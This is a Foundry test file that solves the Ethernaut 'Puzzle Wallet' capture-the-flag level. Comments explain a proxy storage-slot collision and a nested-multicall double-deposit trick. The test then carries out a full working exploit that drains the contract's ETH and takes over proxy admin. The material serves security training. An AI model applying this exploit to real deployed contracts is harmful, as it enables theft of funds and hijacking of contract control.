// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {PuzzleProxy, PuzzleWallet} from "../src/PuzzleWallet.sol";

/// @dev Interact with wallet logic through the proxy (delegatecall).
interface IPuzzleWallet {
    function owner() external view returns (address);
    function maxBalance() external view returns (uint256);
    function whitelisted(address) external view returns (bool);
    function balances(address) external view returns (uint256);
    function init(uint256 _maxBalance) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
}

interface IPuzzleProxy {
    function pendingAdmin() external view returns (address);
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function approveNewAdmin(address _expectedAdmin) external;
    function upgradeTo(address _newImplementation) external;
}

contract PuzzleWalletTest is Test {
    PuzzleProxy public proxy;
    PuzzleWallet public implementation;
    IPuzzleWallet public target; // wallet ABI at the proxy address
    IPuzzleProxy public proxyAsAdmin; // proxy ABI at the same address

    address public deployer = makeAddr("deployer"); // proxy admin + initial owner
    address public attacker = makeAddr("attacker");

    // Ethernaut seeds the proxy with a small deposit.
    uint256 constant INITIAL_DEPOSIT = 0.001 ether;

    function setUp() public {
        vm.startPrank(deployer);

        implementation = new PuzzleWallet();

        // init runs via proxy constructor delegatecall → owner = deployer, maxBalance set.
        bytes memory initData = abi.encodeWithSignature("init(uint256)", 100 ether);
        proxy = new PuzzleProxy(deployer, address(implementation), initData);

        target = IPuzzleWallet(address(proxy));
        proxyAsAdmin = IPuzzleProxy(address(proxy));

        // Like Ethernaut: whitelist deployer and deposit ETH into the proxy.
        target.addToWhitelist(deployer);
        vm.deal(deployer, INITIAL_DEPOSIT);
        target.deposit{value: INITIAL_DEPOSIT}();

        vm.stopPrank();
    }

    function testExploit() public {
        // Win condition (Ethernaut):
        //   proxy.admin() == attacker
        //
        // Storage collision (same slots on the proxy):
        //   slot 0 → PuzzleProxy.pendingAdmin  ==  PuzzleWallet.owner
        //   slot 1 → PuzzleProxy.admin         ==  PuzzleWallet.maxBalance
        //
        // Attack outline:
        //   1. Call proxy.proposeNewAdmin(attacker)
        //      → pendingAdmin = attacker  AND  wallet.owner = attacker
        //   2. As owner (via wallet ABI): target.addToWhitelist(attacker)
        //   3. Drain proxy ETH to 0 so setMaxBalance can run:
        //        - multicall allows nested delegatecalls; deposit() guard only
        //          checks the outer multicall's depositCalled flag
        //        - Nest: multicall([ deposit, multicall([deposit]) ]) with msg.value = current balance
        //          → balances[attacker] credited twice for one msg.value
        //        - execute(attacker, 2 * deposited, "") to empty the contract
        //   4. target.setMaxBalance(uint256(uint160(attacker)))
        //      → overwrites slot 1 → proxy.admin = attacker
        //
        // Tip (calldata building):
        //   bytes[] memory data = new bytes[](2);
        //   data[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);
        //   bytes[] memory nested = new bytes[](1);
        //   nested[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);
        //   data[1] = abi.encodeWithSelector(IPuzzleWallet.multicall.selector, nested);
        //   target.multicall{value: INITIAL_DEPOSIT}(data);
        //
        // Tip: fund attacker first if you need to match the proxy's ETH on deposit:
        //   vm.deal(attacker, INITIAL_DEPOSIT);

        vm.deal(attacker, INITIAL_DEPOSIT);
        vm.startPrank(attacker);

        // ========== YOUR EXPLOIT HERE ==========
        proxy.proposeNewAdmin(attacker);
        target.addToWhitelist(attacker);
        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);
        bytes[] memory nested = new bytes[](1);
        nested[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);
        data[1] = abi.encodeWithSelector(IPuzzleWallet.multicall.selector, nested);
        target.multicall{value: INITIAL_DEPOSIT}(data);
        target.execute(attacker, 2 * INITIAL_DEPOSIT, "");
        target.setMaxBalance(uint256(uint160(attacker)));
        // ========== END EXPLOIT ==========

        vm.stopPrank();

        assertEq(proxyAsAdmin.admin(), attacker, "attacker should be proxy admin");
    }
}
